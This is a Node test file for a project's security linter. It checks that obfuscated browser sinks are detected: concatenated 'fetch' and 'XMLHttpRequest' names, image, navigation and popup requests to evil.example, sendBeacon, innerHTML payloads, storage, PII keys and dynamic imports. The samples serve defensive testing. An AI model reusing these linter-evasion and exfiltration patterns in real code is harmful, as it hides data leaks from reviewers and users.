import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { lintRepo, lintSource } from "../lint.mjs";

test("AST + regex linter catches all 10 C16 bypass vectors and obfuscated sinks (SEC-M3-005)", () => {
  const webFile = "apps/web/src/ui/Probe.tsx";
  const pkgFile = "packages/domain/src/probe.ts";

  const bypassVectors = [
    // 1. String literal containing `//` followed by `fetch(u)` on the same or next line
    { code: 'const u = "https://a//b"; fetch(u);', file: webFile, scope: "web", match: /network access/ },
    // 2. String literals containing `/*` and `*/` wrapping `fetch(...)`
    { code: 'const a = "/*"; fetch("/x"); const b = "*/";', file: webFile, scope: "web", match: /network access/ },
    // 3. Computed property concatenation `globalThis["fe" + "tch"]`
    { code: 'globalThis["fe" + "tch"]("/steal");', file: webFile, scope: "web", match: /network access/ },
    // 4. Const variable folding + dynamic element access `window[k]`
    { code: 'const k = "fe" + "tch"; window[k]("/steal");', file: webFile, scope: "web", match: /network access/ },
    // 5. Resource exfiltration via `new Image().src`
    { code: 'const img = new Image(); img.src = "https://evil.example/x";', file: webFile, scope: "web", match: /constructor sink/ },
    // 6. Navigation exfiltration via `location.href` / `location.assign` / `location.replace`
    { code: 'location.href = "https://evil.example/?d=1";', file: webFile, scope: "web", match: /navigation sink/ },
    { code: 'window.location.replace("https://evil.example/");', file: webFile, scope: "web", match: /navigation sink/ },
    // 7. Popup / navigation sink `window.open`
    { code: 'window.open("https://evil.example/");', file: webFile, scope: "web", match: /navigation\/popup sink/ },
    // 8. Computed `XMLHttpRequest` via string concat or template literal
    { code: 'const X = window["XML" + "HttpRequest"]; new X();', file: webFile, scope: "web", match: /network access/ },
    { code: 'const X = globalThis[`XML${"HttpRequest"}`];', file: pkgFile, scope: "packages", match: /network access/ },
    // 9. Worker / SharedWorker / Audio constructor sinks
    { code: 'new Worker("sw.js");', file: webFile, scope: "web", match: /constructor sink/ },
    { code: 'new SharedWorker("sw.js");', file: pkgFile, scope: "packages", match: /constructor sink/ },
    { code: 'new Audio("https://evil.example/a.wav");', file: webFile, scope: "web", match: /constructor sink/ },
    // 10. Array.join("") obfuscation & arbitrary computed access on window/document
    { code: 'window[["send", "Beacon"].join("")]("/x");', file: webFile, scope: "web", match: /network access/ },
    { code: 'const dynamicKey = Math.random() > 0 ? "a" : "b"; window[dynamicKey];', file: webFile, scope: "web", match: /computed property access/ },
    // HTML injection via computed property,Storage outside IndexedDB, PII field names, forbidden imports
    { code: 'el["inner" + "HTML"] = "<img onerror=alert(1)>";', file: webFile, scope: "web", match: /HTML injection sink/ },
    { code: 'window["local" + "Storage"].setItem("k", "v");', file: webFile, scope: "web", match: /storage outside IndexedDB/ },
    { code: 'const record = { ["student" + "Id"]: "24020001" };', file: webFile, scope: "web", match: /PII field name/ },
    { code: 'import("@ky-nay/" + "parser");', file: webFile, scope: "web", match: /parser import outside/ },
    { code: 'import("node:" + "fs");', file: webFile, scope: "web", match: /Node built-in import/ },
  ];

  for (const sample of bypassVectors) {
    const errors = lintSource(sample.code, sample.file, sample.scope);
    assert.ok(
      errors.some((err) => sample.match.test(err)),
      `Expected ${sample.code} to match ${sample.match}, got: ${JSON.stringify(errors)}`,
    );
  }
});

test("lintRepo scans .js/.jsx/.cjs files and allows legitimate loader/registration/IndexedDB usage (SEC-M3-005)", () => {
  const tmp = mkdtempSync(join(tmpdir(), "ky-nay-lint-test-"));
  try {
    mkdirSync(join(tmp, "apps", "web", "src", "data"), { recursive: true });
    mkdirSync(join(tmp, "apps", "web", "src", "ui"), { recursive: true });
    mkdirSync(join(tmp, "packages", "domain", "src"), { recursive: true });

    // Legitimate files: loader.ts using fetch, registration import, indexedDB.open, window.location.reload()
    writeFileSync(
      join(tmp, "apps", "web", "src", "data", "loader.ts"),
      'export async function load() { return fetch("./data/manifest.json"); }\n',
    );
    writeFileSync(
      join(tmp, "apps", "web", "src", "ui", "App.tsx"),
      'import { parseRegistration } from "@ky-nay/parser/registration";\nexport function reload() { indexedDB.open("ky-nay", 1); window.location.reload(); return typeof parseRegistration; }\n',
    );
    assert.deepEqual(lintRepo(tmp), []);

    // Plain .js file in apps/web/src attempting obfuscated fetch is caught
    writeFileSync(
      join(tmp, "apps", "web", "src", "ui", "sneaky.js"),
      'const u = "http://x//"; globalThis["fe" + "tch"](u);\n',
    );
    const errors = lintRepo(tmp);
    assert.equal(errors.length, 1);
    assert.match(errors[0], /sneaky\.js:1: network access outside the artifact loader/);
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});
